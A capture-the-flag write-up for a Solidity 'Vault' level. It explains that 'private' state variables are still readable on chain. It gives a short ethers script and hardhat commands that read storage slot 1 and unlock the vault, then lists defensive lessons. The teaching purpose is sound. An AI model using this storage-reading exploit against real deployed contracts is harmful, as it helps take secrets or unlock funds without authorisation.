# Level 8: Vault Challenge

## Challenge Description

This level introduces the concept of storage visibility in Ethereum smart contracts. The goal is to unlock a vault by finding a password that's declared as `private` in the contract.

## Contract Location

The challenge contract is located at:
```
/contracts/level-08-vault/Vault.sol
```

## Understanding the Challenge

The `Vault` contract is a simple contract that has a boolean variable `locked` and a `private` password. To unlock the vault, you need to call the `unlock` function with the correct password:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

### The Vulnerability

The vulnerability is in the misunderstanding of what `private` means in Solidity. While `private` variables are not directly accessible from other contracts, **all data on the blockchain is public**. The `private` keyword only restricts access within the smart contract context, but the data is still stored on the blockchain and can be read by anyone with access to the blockchain data.

## Winning Strategy

To win this challenge, you need to:

1. Understand how data is stored in Ethereum contracts
2. Read the contract's storage directly to find the password
3. Call the `unlock` function with the retrieved password

## Hint for Thinking

Ask yourself:
* What does `private` really mean in Solidity?
* Can blockchain data truly be private?
* How are variables stored in a contract's storage?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

The solution involves reading the contract's storage directly to retrieve the password.

### Understanding Solidity Storage

In Solidity, state variables are stored sequentially in "slots" based on their declaration order:
1. The `locked` boolean is stored in slot 0
2. The `password` bytes32 is stored in slot 1

Since we know exactly where the password is stored, we can read it directly from the blockchain.

### Solution Script

```javascript
// Read the password from storage slot 1
const password = await ethers.provider.getStorage(vaultContractAddress, 1);

// Use the password to unlock the vault
await vaultContract.unlock(password);
```

## Step-by-Step Solution Guide

### 1. Deploy the Vault Contract

If you're testing locally, deploy the Vault contract first:

```shell
npx hardhat deploy --tags vault
```

### 2. Execute the Exploit

Run the provided script to read the password from storage and unlock the vault:

```shell
npx hardhat run scripts/level-08-vault/read-vault-password.ts --network sepolia
```

Or specify a custom target address:

```shell
CONTRACT_ADDRESS=0xYourVaultAddress npx hardhat run scripts/level-08-vault/read-vault-password.ts --network sepolia
```

The script will:
1. Check if the vault is initially locked
2. Read the password directly from storage slot 1
3. Call the `unlock` function with the retrieved password
4. Verify that the vault is now unlocked

### 3. Verify Your Success

After executing the solution, check if the `locked` variable is set to `false`.

## Lessons Learned

This challenge teaches important lessons about data privacy on the blockchain:

1. **No True Privacy on the Blockchain**: Everything on the blockchain is public. The `private` keyword in Solidity only restricts access from other contracts, but not from users who can inspect the blockchain data.

2. **Storage Layout**: Understanding how Solidity arranges variables in storage is crucial for both security and optimization.

3. **Sensitive Data**: Never store sensitive information (like passwords, private keys, etc.) directly on the blockchain, even if they're declared as `private`.

4. **Alternative Solutions**: For applications requiring privacy, consider using:
   - Zero-knowledge proofs
   - Off-chain storage with hashed references
   - Encryption (though the keys would still need to be managed off-chain)

5. **Storage vs. Memory**: Solidity's `private` keyword only affects contract code access, not the actual visibility of data on the blockchain.
